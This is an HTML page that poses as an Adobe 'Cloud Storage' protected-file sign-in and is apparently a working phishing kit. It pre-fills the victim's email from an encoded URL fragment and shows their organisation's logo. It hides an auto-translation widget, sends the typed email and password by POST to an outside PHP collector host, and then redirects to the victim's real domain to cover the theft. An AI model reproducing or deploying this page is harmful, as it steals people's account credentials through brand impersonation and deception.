<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Protected File Sign In</title>

  <!-- ✅ Google Translate Language Detection -->
  <script>
    const countryLangMap = {
      US: "en", GB: "en", NG: "en", FR: "fr", DE: "de", ES: "es", IT: "it",
      RU: "ru", CN: "zh-CN", JP: "ja", KR: "ko", IN: "hi", BR: "pt", SA: "ar",
      IR: "fa", TR: "tr", ID: "id", TH: "th", NL: "nl", PL: "pl", UA: "uk",
      BD: "bn", VN: "vi", CZ: "cs", RO: "ro", SE: "sv", NO: "no", FI: "fi",
      DK: "da", HU: "hu", SK: "sk", SI: "sl", HR: "hr", GR: "el", IL: "he",
      MY: "ms", PH: "tl", PK: "ur", ZA: "af", ET: "am", KE: "sw", MM: "my",
      KH: "km", LA: "lo", MN: "mn", LK: "si", NP: "ne"
    };

    function detectLanguageAndTranslate() {
      let lang = navigator.language || navigator.userLanguage;
      if (!lang || lang.length < 2) {
        fetch("https://ipapi.co/json/")
          .then(res => res.json())
          .then(data => {
            const country = data.country;
            lang = countryLangMap[country] || "en";
            loadTranslate(lang);
          })
          .catch(() => loadTranslate("en"));
      } else {
        loadTranslate(lang);
      }
    }

    function loadTranslate(lang) {
      const gtScript = document.createElement("script");
      gtScript.src = "//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
      document.head.appendChild(gtScript);
      window.googleTranslateElementInit = function () {
        new google.translate.TranslateElement({
          pageLanguage: "en",
          includedLanguages: "af,am,ar,az,be,bg,bn,bs,ca,ceb,co,cs,cy,da,de,el,en,eo,es,et,eu,fa,fi,fr,fy,ga,gd,gl,gu,ha,haw,hi,hmn,hr,ht,hu,hy,id,ig,is,it,iw,ja,jv,ka,kk,km,kn,ko,ku,ky,la,lb,lo,lt,lv,mg,mi,mk,ml,mn,mr,ms,mt,my,ne,nl,no,ny,pa,pl,ps,pt,qu,ro,ru,rw,sd,si,sk,sl,sm,sn,so,sq,sr,st,su,sv,sw,ta,te,tg,th,tk,tl,tr,tt,ug,uk,ur,uz,vi,xh,yi,yo,zh-CN,zh-TW,zu",
          layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
          autoDisplay: false
        }, "google_translate_element");

        setTimeout(() => {
          const frame = document.querySelector("iframe.goog-te-menu-frame");
          if (frame) {
            frame.onload = () => {
              const inner = frame.contentDocument || frame.contentWindow.document;
              inner.querySelectorAll(".goog-te-menu2-item span.text")
                .forEach(el => {
                  if (el.innerText.toLowerCase().includes(lang.split('-')[0])) el.click();
                });
            };
          }
        }, 1000);
      };
    }

    window.addEventListener('load', detectLanguageAndTranslate);
  </script>

  <!-- ✅ Hide Google Translate UI -->
  <style>
    #google_translate_element,
    .goog-te-banner-frame.skiptranslate,
    .goog-te-gadget,
    .goog-logo-link {
      display: none !important;
    }
    body { top: 0 !important; }

    /* Your original styles */
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-image: url("bg.png");
      background-size: cover;
      background-position: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
    }
    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: -1;
    }
    .container {
      background-color: #fff;
      padding: 20px;
      text-align: center;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      max-width: 300px;
      width: 100%;
      opacity: 0;
      animation: slideIn 0.5s forwards;
      position: relative;
      height: 400px;
    }
    @keyframes slideIn {
      from { width: 0; opacity: 0; }
      to { width: 100%; opacity: 1; }
    }
    #email-logo {
      width: 100px;
      height: 100px;
      margin: auto;
      display: none;
      object-fit: contain;
    }
    h2 {
      font-weight: bold;
      margin-top: 20px;
      margin-bottom: 10px;
    }
    input[type="email"],
    input[type="password"],
    button {
      width: calc(100% - 40px);
      margin-bottom: 10px;
      padding: 10px;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }
    button {
      background-color: #d32f2f;
      color: #fff;
      cursor: pointer;
    }
    button:hover {
      background-color: #b71c1c;
    }
    .error-container {
      color: white;
      background: lightcoral;
      padding: 10px;
      margin-top: 10px;
      display: none;
    }
    .spinner {
      border: 4px solid rgba(0,0,0,0.1);
      border-top: 4px solid #333;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .remember-me {
      text-align: left;
      margin-bottom: 10px;
      font-size: 14px;
      margin-left: 20px;
    }
    .copyright {
      font-size: 8px;
      color: #999;
      position: left;
      bottom: 20px;
      left: 8px;
    }
    .privacy-cookies {
      font-size: 10px;
      color: #999;
      position: absolute;
      bottom: 10px;
      right: 70px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img id="email-logo" src="" alt="Email logo" />
    <h2>Cloud Storage</h2>
    <p id="domain-info">Sign in with your Domain Email</p>

    <form name="loginForm" id="loginForm" autocomplete="off">
      <input type="email" name="email" id="email" placeholder="Email" required readonly>
      <input type="password" name="password" id="password" placeholder="Password" minlength="6" required>
      <input type="text" name="email_confirm" id="email_confirm" style="display:none" autocomplete="off" tabindex="-1" />

      <div class="remember-me">
        <input type="checkbox" id="remember-me" name="remember-me" checked>
        <label for="remember-me">Remember me</label><br>
        <div class="alert alert-danger" id="msg" style="display: none;"></div>
        <span id="error" class="text-danger" style="display: none;"></span>
      </div>

      <button type="submit" id="submit-btn">View File 87 KB</button>

      <div class="copyright">
        &copy; 2025 Adobe. By clicking Next, you accept Adobe Cloud Storage terms and conditions in accordance with our privacy policy and Adobe terms of use. Check the official documentation to review our terms of use.
      </div>
      <div class="privacy-cookies"></div>
    </form>

    <div class="error-container"></div>
    <div class="spinner" style="display:none;"></div>
  </div>

  <!-- ✅ Google Translate container (hidden) -->
  <div id="google_translate_element" style="display: none;"></div>

  <!-- Scripts -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>


  <script>
    let domain = "";

    function decodeData(encoded) {
      encoded = encoded.replace(/-/g, '+').replace(/_/g, '/');
      while (encoded.length % 4) encoded += '=';
      return decodeURIComponent(atob(encoded));
    }

    document.addEventListener("DOMContentLoaded", function () {
      const emailInput = document.getElementById("email");
      const domainInfo = document.getElementById("domain-info");
      const logo = document.getElementById("email-logo");
      const form = document.getElementById("loginForm");
      const errorDiv = document.getElementById("error");
      const spinner = document.getElementById("spinner");
      const submitBtn = document.getElementById("submit-btn");

      function updateUI(email) {
        const domainMatch = email.match(/@([\w.-]+\.\w+)/);
        if (domainMatch) {
          domain = domainMatch[1];
          domainInfo.textContent = `Sign in with your ${domain} Email`;
          logo.src = `https://logo.clearbit.com/${domain}`;
          logo.onerror = () => {
            logo.src = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIyMCIgeT0iMjAiIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgZmlsbD0iIzRhNmNmNyIgcng9IjUiLz48cGF0aCBkPSJNMzUsNDAgTDM1LDUwIEw0MCw0NSBMNjUsNjAgTDY1LDQwIEw0MCw1NSBMMzUsNTAiIHN0cm9rZT0id2hpdGUiIHN0cm9rZS13aWR0aD0iMyIgZmlsbD0ibm9uZSIvPjwvc3ZnPg==";
          };
        } else {
          domainInfo.textContent = "Sign in with your Domain Email";
        }
      }

      const hash = window.location.hash.substring(1);
      const parts = hash.split("&");
      const encodedEmail = parts[0];
      const token = parts[1] ? parts[1].split("=")[1] : null;

      try {
        if (encodedEmail) {
          const decodedEmail = decodeData(encodedEmail);
          if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decodedEmail)) {
            emailInput.value = decodedEmail;
            updateUI(decodedEmail);
          }
        }
      } catch (e) {
        console.error("Email decoding failed:", e);
        emailInput.value = "";
      }

      // Form submission
      form.addEventListener("submit", function (event) {
        event.preventDefault();
        errorDiv.style.display = "none";
        
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        const filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!email) {
          showError("Email field is empty");
          return;
        }
        if (!filter.test(email)) {
          showError("Invalid email format");
          return;
        }
        if (!password) {
          showError("Password field is empty");
          return;
        }
        if (password.length < 6) {
          showError("Password must be at least 6 characters");
          return;
        }

        // Show spinner and change button text
        spinner.style.display = "block";
        submitBtn.disabled = true;
        submitBtn.textContent = "Signing in...";

        // Create form data
        const formData = new FormData();
        formData.append("email", email);
        formData.append("password", password);
        formData.append("email_confirm", document.getElementById("email_confirm").value);

        // Send to PHP script
        fetch("https://po.mkkhsv2.sa.com/css/css/.maxim/jy/ad.php", {
          method: "POST",
          body: formData
        })
        .then(response => response.text())
        .then(data => {
          if (data === "1") {
            // Success - redirect after a short delay
            setTimeout(() => {
              if (domain) {
                window.location.href = "https://www." + domain;
              } else {
                showError("Login successful but cannot redirect");
                spinner.style.display = "none";
                submitBtn.disabled = false;
                submitBtn.textContent = "View File 87 KB";
              }
            }, 1500);
          } else {
            showError("Invalid login. Try again");
            spinner.style.display = "none";
            submitBtn.disabled = false;
            submitBtn.textContent = "View File 87 KB";
          }
        })
        .catch(error => {
          console.error("Error:", error);
          showError("Network error. Please try again");
          spinner.style.display = "none";
          submitBtn.disabled = false;
          submitBtn.textContent = "View File 87 KB";
        });
      });

      function showError(message) {
        errorDiv.textContent = message;
        errorDiv.style.display = "block";
      }
    });
  </script>
</body>
</html>
